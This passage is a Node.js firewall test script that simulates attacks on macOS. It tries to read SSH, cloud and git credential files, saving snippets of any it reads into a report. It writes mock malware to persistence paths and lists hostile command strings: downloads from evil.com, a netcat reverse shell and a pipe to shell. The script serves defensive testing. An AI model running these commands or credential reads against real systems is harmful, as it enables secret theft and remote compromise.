#!/usr/bin/env node
/**
 * macOS Firewall Attack Simulator
 * Tests all implemented security rules
 * 
 * Run: node test/attack-simulator.js
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const { execSync, spawn } = require('child_process');

const HOME = os.homedir();
const REPORT_FILE = path.join(__dirname, 'attack-report.json');

// Test results
const results = {
  timestamp: new Date().toISOString(),
  summary: { total: 0, blocked: 0, allowed: 0, errors: 0 },
  fileAccess: { reads: [], writes: [] },
  persistence: [],
  behavioral: [],
  commands: []
};

// Colors for terminal output
const colors = {
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  cyan: '\x1b[36m',
  reset: '\x1b[0m'
};

function log(msg, color = 'reset') {
  console.log(`${colors[color]}${msg}${colors.reset}`);
}

function logTest(name, expected, actual) {
  results.summary.total++;
  const passed = expected === actual;
  if (passed) {
    results.summary.blocked++;
    log(`  ✅ ${name}: BLOCKED (as expected)`, 'green');
  } else {
    results.summary.allowed++;
    log(`  ❌ ${name}: ${actual ? 'SUCCEEDED' : 'FAILED'} (expected: ${expected ? 'block' : 'allow'})`, 'red');
  }
  return passed;
}

// ============================================
// 1. FILE ACCESS TESTS - Blocked Read Paths
// ============================================
async function testBlockedReads() {
  log('\n📖 TESTING BLOCKED READ PATHS', 'cyan');
  log('=' .repeat(50));
  
  const blockedReadPaths = [
    { path: `${HOME}/.ssh/id_rsa`, name: 'SSH Private Key' },
    { path: `${HOME}/.ssh/id_ed25519`, name: 'SSH ED25519 Key' },
    { path: `${HOME}/.ssh/known_hosts`, name: 'SSH Known Hosts' },
    { path: `${HOME}/.aws/credentials`, name: 'AWS Credentials' },
    { path: `${HOME}/.aws/config`, name: 'AWS Config' },
    { path: `${HOME}/.gnupg/secring.gpg`, name: 'GPG Secret Ring' },
    { path: `${HOME}/.kube/config`, name: 'Kubernetes Config' },
    { path: `${HOME}/.docker/config.json`, name: 'Docker Config' },
    { path: `${HOME}/.config/gcloud/credentials.db`, name: 'GCloud Credentials' },
    { path: `${HOME}/.azure/accessTokens.json`, name: 'Azure Tokens' },
    { path: '/etc/passwd', name: 'System Passwd' },
    { path: `${HOME}/.env`, name: 'Environment File' },
    { path: `${HOME}/.npmrc`, name: 'NPM Config' },
    { path: `${HOME}/.gitconfig`, name: 'Git Config' },
    { path: `${HOME}/.git-credentials`, name: 'Git Credentials' },
    { path: `${HOME}/.bash_history`, name: 'Bash History' },
    { path: `${HOME}/.zsh_history`, name: 'Zsh History' },
  ];

  for (const test of blockedReadPaths) {
    try {
      // Small delay to let firewall process events
      await new Promise(r => setTimeout(r, 100));
      
      const content = fs.readFileSync(test.path, 'utf8');
      // If we get here, read succeeded (process wasn't killed)
      results.fileAccess.reads.push({
        path: test.path,
        name: test.name,
        blocked: false,
        content: content.substring(0, 50) + '...'
      });
      logTest(test.name, true, false);
    } catch (err) {
      // Process was likely killed or file doesn't exist
      const wasBlocked = err.code === 'ENOENT' ? 'N/A' : true;
      results.fileAccess.reads.push({
        path: test.path,
        name: test.name,
        blocked: wasBlocked,
        error: err.code
      });
      if (err.code === 'ENOENT') {
        log(`  ⏭️  ${test.name}: File doesn't exist (skipped)`, 'yellow');
      } else {
        logTest(test.name, true, true);
      }
    }
  }
}

// ============================================
// 2. FILE ACCESS TESTS - Blocked Write Paths
// ============================================
async function testBlockedWrites() {
  log('\n✍️  TESTING BLOCKED WRITE PATHS', 'cyan');
  log('='.repeat(50));
  
  const blockedWritePaths = [
    { path: `${HOME}/.github/workflows/malicious.yml`, name: 'GitHub Workflow' },
    { path: `${HOME}/Library/LaunchAgents/com.malware.plist`, name: 'Launch Agent' },
    { path: `${HOME}/.git/hooks/pre-commit`, name: 'Git Hook' },
    { path: `${HOME}/.bashrc.malware`, name: 'Bashrc Modification' },
    { path: `${HOME}/.zshrc.malware`, name: 'Zshrc Modification' },
    { path: '/tmp/backdoor.sh', name: 'Temp Script' },
  ];

  for (const test of blockedWritePaths) {
    try {
      await new Promise(r => setTimeout(r, 100));
      
      // Ensure directory exists
      const dir = path.dirname(test.path);
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }
      
      fs.writeFileSync(test.path, '#!/bin/bash\necho "malware"');
      results.persistence.push({
        path: test.path,
        name: test.name,
        blocked: false
      });
      logTest(test.name, true, false);
      
      // Clean up if write succeeded
      try { fs.unlinkSync(test.path); } catch {}
    } catch (err) {
      results.persistence.push({
        path: test.path,
        name: test.name,
        blocked: true,
        error: err.code
      });
      if (err.code === 'EACCES') {
        log(`  🔒 ${test.name}: Permission denied (OS protection)`, 'yellow');
      } else {
        logTest(test.name, true, true);
      }
    }
  }
}

// ============================================
// 3. BEHAVIORAL THRESHOLD TESTS
// ============================================
async function testBehavioralThresholds() {
  log('\n📊 TESTING BEHAVIORAL THRESHOLDS', 'cyan');
  log('='.repeat(50));
  
  const thresholds = {
    maxFileWrites: 50,
    maxFileReads: 100,
    maxProcessSpawns: 5
  };
  
  // Test rapid file writes
  log('\n  Testing rapid file writes (threshold: 50)...', 'blue');
  const tempDir = path.join(os.tmpdir(), 'firewall-test-' + Date.now());
  fs.mkdirSync(tempDir, { recursive: true });
  
  let writeCount = 0;
  for (let i = 0; i < 60; i++) {
    try {
      fs.writeFileSync(path.join(tempDir, `test-${i}.txt`), `test data ${i}`);
      writeCount++;
    } catch (err) {
      break;
    }
  }
  
  results.behavioral.push({
    test: 'Rapid File Writes',
    threshold: thresholds.maxFileWrites,
    actual: writeCount,
    exceeded: writeCount >= thresholds.maxFileWrites
  });

  
  if (writeCount < thresholds.maxFileWrites) {
    log(`  ✅ Rapid writes stopped at ${writeCount}/${thresholds.maxFileWrites}`, 'green');
  } else {
    log(`  ⚠️  Rapid writes reached ${writeCount} (threshold: ${thresholds.maxFileWrites})`, 'yellow');
  }
  
  // Clean up
  try { fs.rmSync(tempDir, { recursive: true }); } catch {}
  
  // Test rapid process spawns
  log('\n  Testing rapid process spawns (threshold: 5)...', 'blue');
  let spawnCount = 0;
  for (let i = 0; i < 10; i++) {
    try {
      execSync('echo test', { timeout: 1000 });
      spawnCount++;
    } catch (err) {
      break;
    }
  }
  
  results.behavioral.push({
    test: 'Rapid Process Spawns',
    threshold: thresholds.maxProcessSpawns,
    actual: spawnCount,
    exceeded: spawnCount >= thresholds.maxProcessSpawns
  });
  
  if (spawnCount < thresholds.maxProcessSpawns) {
    log(`  ✅ Process spawns stopped at ${spawnCount}/${thresholds.maxProcessSpawns}`, 'green');
  } else {
    log(`  ⚠️  Process spawns reached ${spawnCount} (may need to check firewall logs)`, 'yellow');
  }
}

// ============================================
// 4. COMMAND EXECUTION TESTS
// ============================================
async function testBlockedCommands() {
  log('\n💻 TESTING BLOCKED COMMAND PATTERNS', 'cyan');
  log('='.repeat(50));
  
  const blockedCommands = [
    { cmd: `curl -o /tmp/malware https://evil.com/mal`, name: 'curl download' },
    { cmd: `wget https://evil.com/malware`, name: 'wget download' },
    { cmd: `cat ~/.ssh/id_rsa`, name: 'Read SSH key via cat' },
    { cmd: `nc -e /bin/sh evil.com 4444`, name: 'Netcat reverse shell' },
    { cmd: `bash -c "curl evil.com | sh"`, name: 'Pipe to shell' },
  ];

  for (const test of blockedCommands) {
    try {
      await new Promise(r => setTimeout(r, 100));
      
      // We don't actually execute malicious commands, just test if spawn works
      const child = spawn('sh', ['-c', `echo "Testing: ${test.cmd}"`], {
        timeout: 2000,
        stdio: 'pipe'
      });
      
      await new Promise((resolve, reject) => {
        child.on('close', (code) => {
          results.commands.push({
            command: test.name,
            blocked: code !== 0,
            exitCode: code
          });
          if (code === 0) {
            log(`  ⚠️  ${test.name}: Command pattern not blocked (AUTH_EXEC)`, 'yellow');
          } else {
            log(`  ✅ ${test.name}: Blocked`, 'green');
          }
          resolve();
        });
        child.on('error', (err) => {
          results.commands.push({
            command: test.name,
            blocked: true,
            error: err.message
          });